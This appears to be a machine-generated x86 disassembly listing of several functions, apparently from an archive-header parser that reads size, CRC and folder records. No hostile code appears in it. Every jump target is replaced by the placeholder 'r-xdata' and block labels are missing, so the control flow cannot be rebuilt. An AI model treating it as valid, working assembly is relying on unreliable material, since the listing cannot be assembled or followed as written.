jne r-xdata
mov eax ebp
imul eax eax 0x18
push eax
mov eax [ esp + 0x20 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
mov [ edi ] esi
test ebp ebp
je r-xdata
push 0x2
jmp r-xdata
mov [ esp + 0x34 ] esi
test ebp ebp
je r-xdata
mov eax esi
mov edx ebp
pop eax
mov edx esi
mov [ esp + 0x28 ] esi
mov ecx [ edi ]
add ecx eax
call sub_4043af
add eax 0x18
dec edx
jne r-xdata
movzx eax [ esp + 0x13 ]
and eax 0xf
push eax
lea edx [ esp + 0x50 ]
mov ecx ebx
mov [ esp + 0x24 ] eax
call sub_404777
pop ecx
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
cmp eax 0x8
ja r-xdata
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
test eax eax
je r-xdata
mov al [ esp + 0x13 ]
test al 0x10
je r-xdata
mov edi esi
lea esi [ esp + eax + 0x4b ]
mov ebx eax
xor ecx ecx
inc ecx
mov [ ebp ] ecx
mov [ ebp + 0x4 ] ecx
mov edx ebp
mov ecx ebx
call sub_40485d
test eax eax
jne r-xdata
movzx eax [ esi ]
cdq
mov ecx edi
call sub_41da80
or [ ebp + 0x8 ] eax
or [ ebp + 0xc ] edx
dec esi
add edi 0x8
dec ebx
jne r-xdata
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x30 ]
xor esi esi
test al al
js r-xdata
xorps xmm0 xmm0
lea edx [ esp + 0x38 ]
mov ecx ebx
movlpd [ esp + 0x38 ] xmm0
call sub_4047d7
test eax eax
jne r-xdata
lea edx [ ebp + 0x4 ]
mov ecx ebx
call sub_40485d
test eax eax
jne r-xdata
lea edx [ esp + 0x13 ]
mov ecx ebx
call sub_404755
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
add eax [ ebp ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x28 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2c ]
add eax [ ebp + 0x4 ]
inc ecx
add edx 0x18
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x28 ] edx
cmp ecx [ esp + 0x14 ]
jb r-xdata
push [ esp + 0x1c ]
mov edx [ esp + 0x3c ]
lea ecx [ ebp + 0x10 ]
call sub_4036e9
pop ecx
test eax eax
je r-xdata
cmp [ ebp ] 0x20
ja r-xdata
mov al [ esp + 0x13 ]
and al 0xf
movzx eax al
cdq
push edx
push eax
mov ecx ebx
call sub_40489f
add esp 0x8
test eax eax
jne r-xdata
mov ebp [ edi ]
add ebp edx
lea edx [ esp + 0x13 ]
mov ecx ebx
call sub_404755
test eax eax
jne r-xdata
test eax eax
je r-xdata
push [ esp + 0x38 ]
mov edx [ ebp + 0x10 ]
mov ecx ebx
call sub_404777
pop ecx
jmp r-xdata
cmp [ ebp + 0x4 ] 0x20
ja r-xdata
mov al [ esp + 0x13 ]
test al 0x10
je r-xdata
lea ebp [ eax - 0x1 ]
mov [ edi + 0x14 ] ebp
test ebp ebp
jne r-xdata
test eax eax
jne r-xdata
mov al [ esp + 0x13 ]
jmp r-xdata
test al 0x20
je r-xdata
lea edx [ esp + 0x20 ]
call sub_40485d
test eax eax
jne r-xdata
mov eax ebp
shl eax 0x3
push eax
mov eax [ esp + 0x20 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov al [ esp + 0x13 ]
test al 0x20
je r-xdata
xorps xmm0 xmm0
lea edx [ esp + 0x40 ]
mov ecx ebx
movlpd [ esp + 0x40 ] xmm0
call sub_4047d7
test eax eax
jne r-xdata
lea edx [ esp + 0x20 ]
mov ecx ebx
call sub_40485d
test eax eax
jne r-xdata
mov ecx esi
mov [ esp + 0x14 ] ecx
test ebp ebp
je r-xdata
push [ esp + 0x44 ]
mov ecx ebx
push [ esp + 0x44 ]
call sub_40489f
add esp 0x8
mov al [ esp + 0x13 ]
mov eax [ esp + 0x18 ]
cmp eax ebp
jb r-xdata
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 8 ]
mov edx eax
mov ecx ebx
mov [ esp + 0x24 ] eax
call sub_40485d
test eax eax
jne r-xdata
mov ebx eax
sub ebx ebp
mov [ edi + 0x18 ] ebx
jne r-xdata
mov edx [ esp + 0x24 ]
add edx 0x4
mov ecx ebx
call sub_40485d
test eax eax
jne r-xdata
mov eax ebx
shl eax 0x2
push eax
mov eax [ esp + 0x20 ]
push eax
call [ eax ]
mov ebp eax
pop ecx
pop ecx
mov [ edi + 0x8 ] ebp
test ebp ebp
je r-xdata
mov [ edi + 0x8 ] esi
mov ecx [ esp + 0x14 ]
inc ecx
mov [ esp + 0x14 ] ecx
cmp ecx ebp
jb r-xdata
cmp ebx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x30 ]
test ebx ebx
je r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
inc esi
cmp esi ebx
jb r-xdata
cmp esi ebx
je r-xdata
mov edx esi
mov ecx edi
call sub_404457
test eax eax
js r-xdata
mov eax [ edi + 0x8 ]
mov ecx ebp
lea edx [ eax + esi * 4 ]
call sub_40485d
test eax eax
jne r-xdata
mov [ ebp ] esi
jmp r-xdata
inc esi
cmp esi ebx
jb r-xdata
sub_404fd3
sub esp 0x18
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x0
push 0xb
mov esi edx
mov [ esp + 0x2c ] edi
call sub_404918
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov edx esi
mov ecx edi
call sub_40485d
test eax eax
jne r-xdata
mov ecx edi
call sub_404c1a
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
imul eax eax 0x28
push eax
mov eax [ esp + 0x34 ]
push eax
call [ eax ]
mov ebp [ esp + 0x34 ]
pop ecx
pop ecx
mov [ ebp ] eax
test eax eax
jne r-xdata
mov ebp [ esp + 0x2c ]
and [ ebp ] eax
xor edx edx
cmp [ esi ] edx
jbe r-xdata
push 0x2
pop eax
jmp r-xdata
xor ebx ebx
cmp [ esi ] ebx
jbe r-xdata
xor ebx ebx
xor ebx ebx
push ebx
push 0xc
mov ecx edi
call sub_404918
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ esp + 0x14 ] eax
mov ecx [ ebp ]
add ecx ebx
call sub_4043ca
inc edx
add ebx 0x28
cmp edx [ esi ]
jb r-xdata
mov [ esp + 0x18 ] ebx
cmp [ esi ] ebx
jbe r-xdata
mov eax [ esp + 0x14 ]
inc ebx
add eax 0x28
mov [ esp + 0x14 ] eax
cmp ebx [ esi ]
jb r-xdata
lea edx [ esp + 0x18 ]
mov ecx edi
call j_sub_4047d7
test eax eax
jne r-xdata
mov ecx ebx
mov [ esp + 0x20 ] ebx
mov edx [ ebp ]
push [ esp + 0x30 ]
add edx eax
mov ecx edi
call sub_404c37
pop ecx
test eax eax
jne r-xdata
mov ebx [ esp + 0x34 ]
shl eax 0x3
push eax
mov eax [ esp + 0x34 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
and [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
cmp [ esp + 0x18 ] 0xa
jne r-xdata
mov eax [ esp + 0x10 ]
xor ecx ecx
mov [ esp + 0x14 ] ecx
test eax eax
je r-xdata
mov ecx edi
call sub_4048c1
xor eax eax
cmp [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
inc eax
add ecx 0x28
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] ecx
cmp eax [ esi ]
jb r-xdata
mov eax [ ebx + 0xc ]
lea edx [ eax + ecx * 8 ]
mov ecx edi
call sub_4047d7
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
mov ecx edi
call j_sub_4047d7
test eax eax
je r-xdata
mov edx [ esi ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
push ebx
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x1c ]
push eax
mov ecx edi
call sub_404a4d
add esp 0xc
mov [ esp + 0x20 ] eax
test eax eax
jne r-xdata
mov ebx [ ebp ]
add ebx ecx
mov ecx ebx
call sub_40443c
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
inc ecx
mov [ esp + 0x14 ] ecx
cmp ecx [ esp + 0x10 ]
jb r-xdata
mov eax [ esp + 0x18 ]
or eax [ esp + 0x1c ]
je r-xdata
jmp r-xdata
push [ esp + 0x10 ]
push ebx
call [ ebx + 0x4 ]
push [ esp + 0x1c ]
push ebx
call [ ebx + 0x4 ]
mov eax [ esp + 0x30 ]
add esp 0x10
jmp r-xdata
xor edx edx
cmp [ esi ] edx
jbe r-xdata
test eax eax
jne r-xdata
mov edi [ esp + 0x14 ]
xor ebx ebx
movzx eax [ edi + edx ]
mov ecx [ ebp ]
lea ebx [ ebx + 0x28 ]
mov [ ecx + ebx - 0xc ] eax
mov eax [ esp + 0x10 ]
mov eax [ eax + edx * 4 ]
mov [ ecx + ebx - 0x8 ] eax
inc edx
cmp edx [ esi ]
jb r-xdata
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x34 ]
sub_40520c
sub esp 0x44
and [ esp + 0x4 ] 0x0
and [ esp + 0x14 ] 0x0
push ebx
push ebp
push esi
mov ebp edx
mov esi ecx
xorps xmm0 xmm0
push edi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x10 ] esi
movlpd [ esp + 0x38 ] xmm0
test ebp ebp
je r-xdata
mov ebx [ esp + 0x5c ]
mov ecx esi
mov [ ebx ] ebp
jmp r-xdata
mov eax [ esp + 0x58 ]
add eax 0x24
mov ecx ebp
lea edx [ esp + 0x38 ]
call j_sub_4047d7
test eax eax
je r-xdata
mov [ eax ] 0x1
lea eax [ eax + 0x28 ]
dec ecx
jne r-xdata
mov esi [ esp + 0x38 ]
mov edi [ esp + 0x3c ]
cmp esi 0xd
jne r-xdata
jmp r-xdata
cmp esi 0xa
jne r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
cmp esi 0x9
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] edi
xor esi esi
test ebp ebp
je r-xdata
mov eax esi
or eax edi
je r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x58 ]
add edi 0x24
mov ecx [ esp + 0x10 ]
call sub_4048c1
test eax eax
jne r-xdata
shl eax 0x3
push eax
mov eax [ esp + 0x70 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ esp + 0x60 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ esp + 0x60 ]
and [ eax ] 0x0
mov eax [ esp + 0x64 ]
and [ eax ] 0x0
mov eax [ esp + 0x68 ]
and [ eax ] 0x0
jmp r-xdata
mov eax [ esp + 0x2c ]
add [ ebx ] eax
mov [ edi ] eax
inc esi
add edi 0x28
cmp esi ebp
jb r-xdata
push [ ebx ]
mov eax [ esp + 0x70 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ esp + 0x64 ]
mov [ ecx ] eax
test eax eax
je r-xdata
push 0x2
pop eax
jmp r-xdata
xor edx edx
mov [ esp + 0x2c ] edx
test ebp ebp
je r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
call sub_40485d
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebx ]
shl eax 0x2
push eax
mov eax [ esp + 0x70 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ esp + 0x68 ]
mov [ ecx ] eax
test eax eax
je r-xdata
cmp esi 0x9
jne r-xdata
mov eax [ esp + 0x58 ]
mov [ esp + 0x20 ] eax
mov edx [ ebx ]
xor eax eax
test edx edx
je r-xdata
test edi edi
jne r-xdata
inc edx
add eax 0x28
mov [ esp + 0x2c ] edx
mov [ esp + 0x20 ] eax
cmp edx ebp
jb r-xdata
cmp esi 0x9
jne r-xdata
test ebp ebp
je r-xdata
mov ecx [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
mov ecx [ ecx ]
mov ebx [ ebx ]
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x38 ]
call j_sub_4047d7
test eax eax
jne r-xdata
mov ecx [ eax + 0x24 ]
xorps xmm0 xmm0
movlpd [ esp + 0x40 ] xmm0
mov [ esp + 0x34 ] ecx
test ecx ecx
je r-xdata
mov ecx [ esp + 0x44 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x40 ]
mov [ esp + 0x18 ] ecx
test edi edi
jne r-xdata
xor ebx ebx
mov eax [ esp + 0x58 ]
mov edi [ esp + 0x24 ]
add eax 0x1c
mov ecx ebp
mov [ ebx + eax ] 0x0
and [ ecx ] 0x0
inc eax
lea ecx [ ecx + 0x4 ]
cmp eax edx
jb r-xdata
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x38 ]
xor edx edx
inc edx
cmp ecx edx
jbe r-xdata
or esi edi
je r-xdata
test edi edi
jne r-xdata
add edi [ eax + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esp + 0x44 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x40 ]
mov [ esp + 0x28 ] edx
mov [ esp + 0x18 ] eax
xor eax eax
mov ecx [ esp + 0x10 ]
call sub_4048c1
test eax eax
jne r-xdata
mov esi [ esp + 0x6c ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x10 ]
and [ esp + 0x34 ] edi
and [ esp + 0x5c ] edi
and [ esp + 0x20 ] edi
push esi
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x64 ]
push eax
call sub_404a4d
mov edi eax
add esp 0xc
mov [ esp + 0x1c ] edi
test edi edi
jne r-xdata
cmp [ eax + 0x8 ] 0x1
jne r-xdata
mov [ esp + 0x24 ] edi
mov edi [ esp + 0x3c ]
add eax 0x28
dec ecx
jne r-xdata
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x14 ]
mov eax [ eax ]
mov edx [ esp + 0x48 ]
mov ebx [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov [ eax + ecx * 8 ] edx
mov ecx [ esp + 0x4c ]
mov [ eax + ebx * 8 + 0x4 ] ecx
mov eax [ esp + 0x28 ]
mov ebx [ esp + 0x5c ]
inc eax
add [ esp + 0x18 ] edx
mov [ esp + 0x28 ] eax
adc [ esp + 0x1c ] ecx
cmp eax [ esp + 0x34 ]
jb r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x38 ]
call j_sub_4047d7
test eax eax
jne r-xdata
push [ esp + 0x5c ]
push esi
call [ esi + 0x4 ]
push [ esp + 0x28 ]
push esi
call [ esi + 0x4 ]
add esp 0x10
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x48 ]
call sub_4047d7
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
jmp r-xdata
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x38 ]
jmp r-xdata
mov eax edi
jmp r-xdata
mov edx [ esp + 0x58 ]
mov esi ebp
mov ebp [ esp + 0x34 ]
add edx 0x1c
mov [ esp + 0x2c ] edx
mov [ esp + 0x28 ] esi
mov ecx eax
call sub_404499
sub eax [ esp + 0x18 ]
mov ecx [ esp + 0x60 ]
mov ebp [ esp + 0x14 ]
mov ecx [ ecx ]
sbb edx [ esp + 0x1c ]
mov [ ecx + ebp * 8 ] eax
mov eax ebp
mov ebp [ esp + 0x30 ]
mov [ ecx + eax * 8 + 0x4 ] edx
mov edx [ esp + 0x2c ]
inc eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
cmp esi 0xa
jne r-xdata
test ecx ecx
je r-xdata
cmp [ edx ] 0x0
je r-xdata
add edx 0x28
dec esi
mov [ esp + 0x2c ] edx
mov [ esp + 0x28 ] esi
jne r-xdata
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x5c ]
mov eax [ eax ]
lea esi [ eax + ebx * 4 ]
mov eax [ esp + 0x64 ]
mov eax [ eax ]
mov edi eax
mov eax [ esp + 0x64 ]
mov eax [ eax ]
mov [ ebx + eax ] cl
mov eax [ esp + 0x68 ]
mov ecx [ eax ]
mov eax [ edx + 0x4 ]
mov [ ecx + ebx * 4 ] eax
inc ebx
jmp r-xdata
mov ecx [ edx + 0x8 ]
cmp ecx 0x1
jne r-xdata
mov ebp [ esp + 0x30 ]
mov esi [ esp + 0x6c ]
mov edi [ esp + 0x1c ]
mov al [ edx + ebp ]
mov [ edi + ebx ] al
mov eax [ esp + 0x20 ]
inc ebx
mov eax [ eax + ebp * 4 ]
inc ebp
mov [ esi ] eax
lea esi [ esi + 0x4 ]
dec ecx
jne r-xdata
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
sub_4055f3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov ebx edx
push edi
lea edx [ ebp - 0x8 ]
mov edi ecx
call j_sub_4047d7
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x8 ]
push 0x4
pop eax
cmp edx [ ebp - 0x4 ]
jne r-xdata
sub ecx 0x0
je r-xdata
xor eax eax
jmp r-xdata
sub ecx 0x6
je r-xdata
push [ ebp + 0x1c ]
lea eax [ esi + 0x8 ]
push eax
lea eax [ esi + 0x4 ]
push eax
lea eax [ esi + 0x14 ]
push esi
push eax
mov edx ebx
mov ecx edi
call sub_404ac1
add esp 0x14
dec ecx
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx edi
call j_sub_4047d7
test eax eax
je r-xdata
push [ ebp + 0x20 ]
lea eax [ esi + 0xc ]
push [ ebp + 0x1c ]
lea edx [ esi + 0x18 ]
push eax
mov ecx edi
call sub_404fd3
add esp 0xc
jmp r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax ecx
cdq
cmp eax ecx
jne r-xdata
jmp r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x20 ]
mov edx [ esi + 0x18 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0xc ]
call sub_40520c
add esp 0x18
jmp r-xdata
sub_4056b3
mov eax [ ecx + 0x40 ]
push esi
mov esi [ eax + edx * 4 + 0x4 ]
push edi
mov edi [ eax + edx * 4 ]
mov edx [ esp + 0xc ]
sub esi edi
test edx edx
je r-xdata
pop edi
mov eax esi
pop esi
retn
mov eax [ ecx + 0x44 ]
lea eax [ eax + edi * 2 ]
test esi esi
je r-xdata
sub eax edx
mov edi esi
mov cx [ eax + edx ]
mov [ edx ] cx
lea edx [ edx + 0x2 ]
dec edi
jne r-xdata
sub_4056e9
push esi
xor esi esi
mov eax esi
push edi
mov edi [ esp + 0x10 ]
cmp [ esp + 0xc ] eax
jbe r-xdata
mov [ edi + eax * 4 ] esi
push 0x10
xor ecx ecx
pop eax
cmp esi edx
cmove eax ecx
mov [ edi + eax * 4 ] esi
push 0x10
pop eax
jmp r-xdata
cmp [ ecx + esi * 2 ] 0x0
jne r-xdata
pop edi
pop esi
retn
inc esi
jmp r-xdata
cmp [ ecx + esi * 2 + 0x1 ] 0x0
je r-xdata
cmp esi edx
jae r-xdata
inc esi
inc eax
cmp eax [ esp + 0xc ]
jb r-xdata
sub_40572d
sub esp 0x1c
and [ esp + 0xc ] 0x0
and [ esp ] 0x0
and [ esp + 0x4 ] 0x0
push ebx
push ebp
push esi
mov esi edx
mov ebp ecx
push edi
lea edx [ esp + 0x24 ]
mov ecx esi
mov [ esp + 0x18 ] ebp
call j_sub_4047d7
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x4
jne r-xdata
test ecx ecx
jne r-xdata
mov eax edx
or eax ecx
je r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4048e9
test eax eax
jne r-xdata
cmp edx 0x5
jne r-xdata
push [ esp + 0x4c ]
lea eax [ esp + 0x20 ]
push [ esp + 0x4c ]
lea edx [ ebp + 0x28 ]
push [ esp + 0x40 ]
mov ecx esi
push [ esp + 0x40 ]
push [ esp + 0x40 ]
push eax
push ebp
call sub_4055f3
add esp 0x1c
test eax eax
jne r-xdata
lea edx [ esp + 0x24 ]
mov ecx esi
call j_sub_4047d7
test eax eax
jne r-xdata
push 0x10
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x20 ]
add [ ebp + 0x28 ] eax
mov eax [ ebp + 0x24 ]
lea edx [ esp + 0x24 ]
adc [ ebp + 0x2c ] eax
mov ecx esi
call j_sub_4047d7
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
mov ecx esi
call sub_40485d
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
mov ebx [ esp + 0x10 ]
mov [ ebp + 0x1c ] ebx
test ebx ebx
jne r-xdata
mov eax [ esp + 0x48 ]
mov ecx ebx
shl ecx 0x5
push ecx
push eax
call [ eax ]
pop ecx
pop ecx
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push 0x2
jmp r-xdata
lea edx [ esp + 0x24 ]
mov ecx esi
call j_sub_4047d7
test eax eax
je r-xdata
mov ecx eax
mov edx ebx
pop eax
mov edi [ esp + 0x24 ]
mov eax edi
or eax [ esp + 0x28 ]
je r-xdata
jmp r-xdata
call sub_4044c7
add ecx 0x20
dec edx
jne r-xdata
jmp r-xdata
xor ecx ecx
mov ebp ecx
mov edi ecx
mov esi ecx
test ebx ebx
je r-xdata
lea edx [ esp + 0x1c ]
mov ecx esi
call sub_4047d7
test eax eax
jne r-xdata
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
jmp r-xdata
mov edx [ esp + 0x10 ]
add edx 0x18
mov ecx [ esp + 0x20 ]
test ecx ecx
ja r-xdata
sub esp 0x1c
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x18 ]
and [ esp + 0x18 ] ebx
push edi
mov edi edx
xor ebp ebp
xorps xmm0 xmm0
mov [ esp + 0x18 ] edi
movlpd [ esp + 0x20 ] xmm0
test eax eax
jne r-xdata
cmp [ eax + esi ] 0x0
sete al
mov [ edx ] al
test al al
je r-xdata
mov [ edx ] 0x1
jmp r-xdata
mov ebp [ esp + 0x1c ]
jb r-xdata
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x30 ] eax
test eax eax
jne r-xdata
and [ esi + 0x30 ] ebx
mov eax [ esp + 0x40 ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov [ edx + 0x1 ] cl
mov ecx [ eax ]
mov eax [ ecx + edi * 8 ]
mov [ edx - 0x10 ] eax
mov eax [ ecx + edi * 8 + 0x4 ]
mov [ edx - 0xc ] eax
mov eax [ esp + 0x38 ]
mov eax [ eax ]
mov eax [ eax + edi * 4 ]
mov [ edx - 0x8 ] eax
mov eax [ esp + 0x34 ]
mov eax [ eax ]
mov al [ edi + eax ]
inc edi
mov [ edx + 0x3 ] al
xor ecx ecx
jmp r-xdata
mov eax edi
cdq
cmp eax edi
jne r-xdata
cmp ebp [ esi + 0x4 ]
ja r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
push 0x2
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov edx [ esi + 0x30 ]
add eax 0x18
cmp [ eax + ebp ] 0x0
sete al
mov [ edx + 0x1 ] al
mov [ edx + 0x1 ] 0x1
jmp r-xdata
inc esi
add edx 0x20
cmp esi ebx
jb r-xdata
push ecx
push ebp
cmp edx [ esp + 0x28 ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
shl eax 0x3
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x34 ] eax
test eax eax
je r-xdata
and [ esi + 0x34 ] ebx
jmp r-xdata
mov [ edx ] ebp
add ebp [ eax ]
lea edx [ edx + 0x4 ]
lea eax [ eax + 0x28 ]
dec ecx
jne r-xdata
mov eax [ esp + 0x3c ]
mov [ edx + 0x2 ] cl
mov eax [ eax ]
test eax eax
jne r-xdata
inc ebp
mov [ edx - 0x10 ] ecx
mov [ edx - 0xc ] ecx
mov [ edx - 0x8 ] ecx
mov [ edx + 0x3 ] cl
sub edi 0xe
je r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
push [ esp + 0x4c ]
mov edi [ esp + 0x40 ]
push edi
mov edx ebx
mov ecx esi
call sub_404968
pop ecx
pop ecx
test eax eax
jne r-xdata
dec edi
je r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov edx [ esi + 0x34 ]
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x20 ]
sub edx eax
xor edx edx
mov [ esp + 0x14 ] edx
test ebx ebx
je r-xdata
push [ esp + 0x4c ]
mov edx [ esp + 0x18 ]
push [ esp + 0x44 ]
mov ecx esi
call sub_404968
pop ecx
pop ecx
jmp r-xdata
dec edi
dec edi
je r-xdata
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
and [ esi + 0x38 ] eax
jmp r-xdata
mov [ edx + eax ] edi
mov [ edx + eax + 0x4 ] ebp
add edi [ eax ]
adc ebp [ eax + 0x4 ]
lea eax [ eax + 0x8 ]
dec ecx
jne r-xdata
mov edi [ esp + 0x18 ]
mov ecx [ edi ]
test eax eax
jne r-xdata
mov ecx esi
call sub_404c1a
test eax eax
jne r-xdata
sub edi 0x3
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
inc eax
cmp eax ebx
jb r-xdata
inc edx
lea eax [ ebp - 0x1 ]
test al 0x1
jne r-xdata
push [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push edi
mov edx ebx
mov ecx esi
call sub_4049e8
pop ecx
pop ecx
test eax eax
jne r-xdata
dec edi
jne r-xdata
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x3c ] eax
test eax eax
je r-xdata
and [ esi + 0x3c ] eax
jmp r-xdata
cmp [ ecx + eax ] 0x0
je r-xdata
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edi [ esp + 0x18 ]
push [ esp + 0x48 ]
lea ecx [ edi + 0x44 ]
mov edx eax
call sub_4036e9
pop ecx
test eax eax
je r-xdata
mov ecx esi
call sub_404c1a
test eax eax
jne r-xdata
push [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push edi
mov edx ebx
mov ecx esi
call sub_4049e8
pop ecx
pop ecx
test eax eax
jne r-xdata
xor edx edx
cmp [ esi + 0x1c ] edx
jbe r-xdata
lea eax [ ebx + 0x1 ]
test eax eax
jne r-xdata
xor ebp ebp
test ebx ebx
je r-xdata
mov ecx esi
call sub_404c1a
test eax eax
jne r-xdata
xor eax eax
mov edi [ esi + 0x10 ]
mov ebp [ esp + 0x1c ]
add edi 0x18
lea eax [ ebx * 4 + 0x4 ]
push eax
mov eax [ esp + 0x4c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
je r-xdata
and [ edi + 0x40 ] eax
jmp r-xdata
push [ edi ]
mov eax [ esp + 0x50 ]
push eax
call [ eax + 0x4 ]
jmp r-xdata
mov edi [ esp + 0x10 ]
add edi 0x4
xor ebp ebp
test ebx ebx
je r-xdata
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
lea edi [ ebp - 0x1 ]
mov ebp [ esp + 0x18 ]
push edi
push [ esi ]
push [ ebp + 0x44 ]
call sub_410c10
mov ecx [ esi ]
add esp 0xc
push [ ebp + 0x40 ]
mov edx edi
push ebx
shr edx 0x1
call sub_4056e9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
pop ecx
pop ecx
jmp r-xdata
inc ebp
add edi 0x20
cmp ebp ebx
jb r-xdata
mov ecx esi
call sub_4047a1
test eax eax
jne r-xdata
push [ edi ]
mov ebp [ esp + 0x50 ]
push ebp
call [ ebp + 0x4 ]
mov edi [ esp + 0x10 ]
add edi 0x14
cmp [ esp + 0x1c ] 0x0
mov eax [ esi + 0x3c ]
mov [ eax + edx * 4 ] ebx
jne r-xdata
mov ecx ebx
imul ecx ecx 0x28
mov eax [ esi + 0x3c ]
or [ eax + edx * 4 ] 0xffffffff
jmp r-xdata
push eax
push edi
jmp r-xdata
mov eax [ esp + 0x44 ]
lea edx [ edi - 0x4 ]
mov eax [ eax ]
mov al [ eax + ebp ]
and [ edi ] 0x0
and [ edx ] 0x0
mov [ edi + 0x18 ] al
test al al
je r-xdata
mov edi [ esp + 0x44 ]
mov edx edi
mov ecx esi
call sub_4047a1
test eax eax
jne r-xdata
inc ebp
add edi 0x20
cmp ebp ebx
jb r-xdata
mov edx edi
mov ecx esi
call sub_4047a1
test eax eax
